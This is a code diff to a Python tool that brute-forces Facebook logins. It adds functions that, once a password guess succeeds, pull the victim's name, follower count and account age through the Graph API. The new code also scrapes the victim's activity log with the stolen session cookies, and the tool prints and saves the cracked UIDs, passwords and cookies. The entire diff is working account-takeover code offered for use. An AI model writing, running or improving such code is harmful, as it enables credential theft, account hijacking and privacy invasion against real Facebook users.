@@ -13,6 +13,7 @@ from rich.columns import Columns as col
 from rich import pretty
 from rich.text import Text as tekz
 from time import localtime as lt
+from datetime import datetime
 pretty.install()
 CON=sol()
  #------------------[ MR-AXL ]-------------------#
@@ -2177,7 +2178,47 @@ def passwrd():
     exit() 
 #--------------------[ METODE-B-API ]-----------------#
  
-def crack(idf,pwv):
+
+
+def get_facebook_user_info(token):
+    try:
+        response = requests.get(
+            f'https://graph.facebook.com/v13.0/me?fields=id,name,followers_count,created_time&access_token={token}')
+        data = response.json()
+
+        created_time = data.get('created_time')
+        created_year = datetime.strptime(
+            created_time, "%Y-%m-%dT%H:%M:%S%z").year if created_time else None
+
+        return {
+            'username': data.get('name'),
+            'followers_count': data.get('followers_count'),
+            'created_year': created_year,
+            # Adding c_user to the returned information
+            'c_user': data.get('id')
+        }
+    except Exception as e:
+        print(f"Error retrieving user information: {e}")
+        return None
+
+
+def check_connected_apps(session, c_user, coki):
+    w = session.get(
+        f"https://mbasic.facebook.com/{c_user}/allactivity?privacy_source=activity_log&log_filter=all_activity", cookies={"cookie": coki}).text
+    sop = BeautifulSoup(w, "html.parser")
+
+    # Extract connected apps or activities
+    apps = [i.text for i in sop.find_all("span", class_="bl")]
+
+    if len(apps) > 0:
+        print("\nConnected Apps or Activities:")
+        for app in apps:
+            print(f"\033[1;97m---\033[1;92m" + app)
+    else:
+        print("\nNo connected apps or activities found.")
+
+
+def crack(idf, pwv, prox, ugen, ugen2, token):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
     sys.stdout.write(f"\r\033[100;95m{bo}[AXL 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
@@ -2211,13 +2252,22 @@ def crack(idf,pwv):
                 coki = po.cookies.get_dict()
                 kuki = (";").join(["%s=%s" % (key, value)
                                    for key, value in ses.cookies.get_dict().items()])
-                print(
-                    f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Ok] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
+
+                user_info = get_facebook_user_info(token)
+
+                if user_info:
+                    print(
+                        f'\r\033[38;5;46m[AXL-Ok🌸] ✅Uid┏━➤ {idf}\n🔑User┏━➤ {user_info["username"]}\n🔑Pass┏━➤ {pw}\n🔑Followers┏━➤ {user_info["followers_count"]}\n📅 Created in year: {user_info["created_year"]}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki}\033[K')
+                else:
+                    print(
+                        f'\r\033[38;5;46m[AXL-Ok🌸] ✅Uid┏━➤ {idf}\n🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki}\033[K')
+
                 os.system(
                     'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                with open('/sdcard/ALIVE-ID' + okc, 'a') as file:
-                    file.write(f"{idf} • {pw} • Cookies: {kuki}\n\n")
-                    check(ses, coki)
+                open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
+
+                # Check connected apps for OK accounts
+                check_connected_apps(ses, user_info['c_user'], coki)
                 break
                 
             else:
@@ -2228,7 +2278,8 @@ def crack(idf,pwv):
  
 #------------------[ METHODE-MBASIC-2 ]-------------------#
  
-def crackfree(idf,pwv):
+
+def crackfree(idf, pwv, prox, ugen, ugen2, token):
     global loop,ok,cp
     sys.stdout.write(f"\r{H}[AXL 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
@@ -2256,14 +2307,26 @@ def crackfree(idf,pwv):
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•AXL-Ok] ✅Uid┏━➤ {idf} \n🔑Pass┏━➤')
-                os.system('espeak -a 300 " Congratulation,  You,  Got,  Alive,  id"')
-                with open('/sdcard/ALIVE-ID' + okc, 'a') as file:
-                    file.write(f"{idf} • {pw} • Cookies: {kuki}\n\n")
-                    check(ses, coki)
+                ok += 1
+                coki = po.cookies.get_dict()
+                kuki = (";").join(["%s=%s" % (key, value)
+                                   for key, value in ses.cookies.get_dict().items()])
+
+                user_info = get_facebook_user_info(token)
+
+                if user_info:
+                    print(
+                        f'\r\033[38;5;46m[AXL-Ok🌸] ✅Uid┏━➤ {idf}\n🔑User┏━➤ {user_info["username"]}\n🔑Pass┏━➤ {pw}\n🔑Followers┏━➤ {user_info["followers_count"]}\n📅 Created in year: {user_info["created_year"]}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki}\033[K')
+                else:
+                    print(
+                        f'\r\033[38;5;46m[AXL-Ok🌸] ✅Uid┏━➤ {idf}\n🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki}\033[K')
+
+                os.system(
+                    'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
+                open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
+
+                # Check connected apps for OK accounts
+                check_connected_apps(ses, user_info['c_user'], coki)
 
                 break
                 
